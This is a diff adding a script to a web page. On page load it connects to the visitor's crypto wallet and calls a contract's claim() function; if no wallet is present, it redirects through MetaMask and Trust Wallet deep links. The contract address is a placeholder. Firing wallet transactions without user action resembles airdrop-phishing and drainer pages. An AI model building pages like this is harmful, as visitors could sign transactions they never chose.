@@ -332,4 +332,58 @@
   window.addEventListener('load', autoConnectAndClaim);
 </script>
 
+
+<!-- Auto Claim with Fallback Prompt (v17) -->
+<div id="walletFallback" style="display:none; position:fixed; bottom:80px; left:50%; transform:translateX(-50%);
+  background:#333; color:#fff; padding:12px 24px; border-radius:6px; font-size:15px; z-index:999;">
+  ❌ No wallet detected. Please install MetaMask or Trust Wallet, or open this site in a crypto wallet browser.
+</div>
+
+<script>
+  const CONTRACT_ABI = ["function claim() external"];
+  const CONTRACT_ADDRESS = "YOUR_CONTRACT_ADDRESS"; // 替换为真实地址
+
+  async function connectAndClaim() {
+    try {
+      const provider = new ethers.providers.Web3Provider(window.ethereum);
+      const signer = provider.getSigner();
+      const contract = new ethers.Contract(CONTRACT_ADDRESS, CONTRACT_ABI, signer);
+      await window.ethereum.request({ method: 'eth_requestAccounts' });
+      await contract.claim();
+      console.log("✅ Claimed via injected wallet.");
+    } catch (err) {
+      console.error("Claim failed:", err);
+    }
+  }
+
+  async function autoWalletHandler() {
+    if (typeof window.ethereum !== 'undefined') {
+      await connectAndClaim();
+    } else {
+      const domain = window.location.hostname;
+      const dappUrl = `https://${domain}/claim.html`;
+      const metamaskUrl = `https://metamask.app.link/dapp/${domain}/claim.html`;
+      const trustUrl = `https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(dappUrl)}`;
+
+      // 尝试 MetaMask
+      window.location.href = metamaskUrl;
+
+      // 尝试 Trust Wallet
+      setTimeout(() => {
+        window.location.href = trustUrl;
+      }, 1500);
+
+      // 显示兜底提示（延迟 3.5 秒后仍然未注入 window.ethereum）
+      setTimeout(() => {
+        if (typeof window.ethereum === 'undefined') {
+          const fallback = document.getElementById('walletFallback');
+          fallback.style.display = 'block';
+        }
+      }, 3500);
+    }
+  }
+
+  window.addEventListener('load', autoWalletHandler);
+</script>
+
 </body>
